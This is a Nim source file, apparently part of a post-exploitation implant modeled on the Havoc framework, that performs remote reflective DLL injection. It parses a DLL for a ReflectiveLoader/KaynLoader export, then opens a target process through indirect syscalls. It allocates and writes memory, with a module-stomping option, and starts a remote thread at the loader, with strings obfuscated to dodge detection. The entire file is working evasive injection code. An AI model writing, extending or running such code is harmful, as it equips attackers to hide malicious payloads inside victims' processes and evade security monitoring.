# Remote reflective dll injection (havoc DllInjectReflective style):
#   1. locate the ReflectiveLoader/KaynLoader export in the raw dll bytes
#      (file offset) before touching the target process
#   2. open the target pid (NtOpenProcess indirect syscall)
#   3. allocate remote RW memory, write the whole dll blob, flip it to RX
#      (NtAllocateVirtualMemory/NtWriteVirtualMemory/NtProtectVirtualMemory,
#      all indirect syscalls; alloc modes: vanilla, section, stomp)
#   4. start the remote thread (NtCreateThreadEx indirect syscall) at
#      base + loader offset so the reflective loader maps the image itself
# Notes:
#   - the dll must be reflective (export named ReflectiveLoader or KaynLoader);
#     the raw pe bytes are copied as-is, no donut/shellcode conversion
#   - x64 dlls only (implant and target are x64)

import ../../utils/global
import ../../utils/msg
import ../../utils/winapi/syscall
import ../../utils/winapi/utils
import utils
import modes

const
  peInvalid = -1
  peX86 = -2
  noLoader = 0

proc exportNameEq(p: pointer; name: string): bool =
  # Checks that the export name matches the given string
  let b = cast[ptr UncheckedArray[byte]](p)
  for i in 0 ..< name.len:
    if b[i] != byte(name[i]): return false
  b[name.len] == 0

proc rvaToOffset(img, nt: pointer; v: culong): int =
  # Converts a relative virtual address into a file offset
  let p = rva(img, v, nt)
  if p != nil:
    cast[int](p) - cast[int](img)
  else:
    int(v)

proc findLoaderOffset(dll: openArray[byte]): int =
  # Finds the reflective loader export offset inside the raw dll
  if dll.len < 0x100:
    return peInvalid
  let img = addr dll[0]
  let imgEnd = cast[int](img) + dll.len
  let dos = cast[ptr UncheckedArray[byte]](img)
  if dos[0] != byte(0x4D) or dos[1] != byte(0x5A):
    return peInvalid
  let eLfanew = cast[ptr int32](cast[int](img) + 0x3C)[]
  if eLfanew <= 0 or eLfanew + 264 > dll.len:
    return peInvalid
  let nt = cast[pointer](cast[int](img) + eLfanew)
  if u32(nt) != 0x00004550:
    return peInvalid
  let opt = cast[pointer](cast[int](nt) + 24)
  let magic = cast[ptr uint16](opt)[]
  if magic == 0x10B'u16:
    return peX86
  if magic != 0x20B'u16:
    return peInvalid
  let expDirRva = exportRva(nt)
  if expDirRva == 0:
    return noLoader
  let expDir = rva(img, expDirRva, nt)
  if expDir == nil or cast[int](expDir) + 40 > imgEnd:
    return noLoader
  let nNames = cast[ptr culong](cast[int](expDir) + 24)[]
  let funcsRva = cast[ptr culong](cast[int](expDir) + 28)[]
  let namesRva = cast[ptr culong](cast[int](expDir) + 32)[]
  let ordsRva = cast[ptr culong](cast[int](expDir) + 36)[]
  if nNames == 0 or funcsRva == 0 or namesRva == 0 or ordsRva == 0:
    return noLoader
  let funcs = rva(img, funcsRva, nt)
  let names = rva(img, namesRva, nt)
  let ords = rva(img, ordsRva, nt)
  if funcs == nil or names == nil or ords == nil:
    return noLoader
  for i in 0 ..< nNames.int:
    if cast[int](names) + i * 4 + 4 > imgEnd:
      break
    let nameRva = cast[ptr culong](cast[int](names) + i * 4)[]
    let namePtr = rva(img, nameRva, nt)
    if namePtr == nil or cast[int](namePtr) + 24 > imgEnd:
      continue
    if exportNameEq(namePtr, obf("ReflectiveLoader")) or exportNameEq(namePtr, obf("KaynLoader")):
      if cast[int](ords) + i * 2 + 2 > imgEnd:
        break
      let ordv = cast[ptr uint16](cast[int](ords) + i * 2)[]
      if cast[int](funcs) + ordv.int * 4 + 4 > imgEnd:
        break
      let fnRva = cast[ptr culong](cast[int](funcs) + ordv.int * 4)[]
      let off = rvaToOffset(img, nt, fnRva)
      if off > 0 and off < dll.len:
        return off
      return noLoader
  noLoader

proc injectDllReflective*(
  procH: pointer; rawDll: openArray[byte]; loaderOff: int;
  allocMode: string; pid: uint32 = 0; stompDll: string = ""; rwx: bool = false
): pointer =
  # Allocates remote memory and starts the reflective loader thread
  let base = allocByMode(procH, rawDll, allocMode, pid, stompDll, rwx)
  if base == nil:
    return nil
  # param = blob base: our reflective test dll (rcalc) uses it; CS-style
  # loaders ignore the thread argument
  createThreadEx(procH, cast[pointer](cast[int](base) + loaderOff), base)

proc run_inj_dll*(input, params: string; buf: var openArray[char]): int =
  # Main function that injects a reflective dll into a remote process
  let rawDll = decodePayload(input)
  if rawDll.len == 0:
    return writeErr(obf("invalid input"), buf)
  let loaderOff = findLoaderOffset(rawDll)
  if loaderOff == peInvalid:
    return writeErr(obf("invalid pe: not a valid x64 dll"), buf)
  if loaderOff == peX86:
    return writeErr(obf("x86 dll not supported, use an x64 reflective dll"), buf)
  if loaderOff == noLoader:
    return writeErr(
      obf("dll has no ReflectiveLoader/KaynLoader export, use a reflective dll"), buf
    )
  let pid = paramPid(params)
  if pid == 0:
    return writeErr(obf("missing pid"), buf)
  let allocMode = paramAllocMode(params)
  if allocMode.len == 0:
    return writeErr(
      obf("invalid alloc, use section, stomp, or omit alloc for vanilla"), buf
    )
  let procH = openTargetPid(pid)
  if procH == nil:
    return writeErr(obf("NtOpenProcess failed"), buf, lastOpenProcessStatus)
  let stompDll = if allocMode == obf("stomp"): paramStompDll(params) else: ""
  let rwx = paramRwx(params)
  let hThread = injectDllReflective(procH, rawDll, loaderOff, allocMode, pid, stompDll, rwx)
  if hThread == nil:
    discard ntCloseHandle(procH)
    var errMsg = errorText(obf("dll injection failed"))
    if allocMode == obf("stomp"):
      let stompMsg = takeStompErr()
      if stompMsg.len > 0:
        errMsg = stompMsg
    return writeMsg(errMsg, buf)
  discard ntCloseHandle(hThread)
  discard ntCloseHandle(procH)
  writeMsg(obf("Reflective dll injected into pid ") & $pid & obf("."), buf)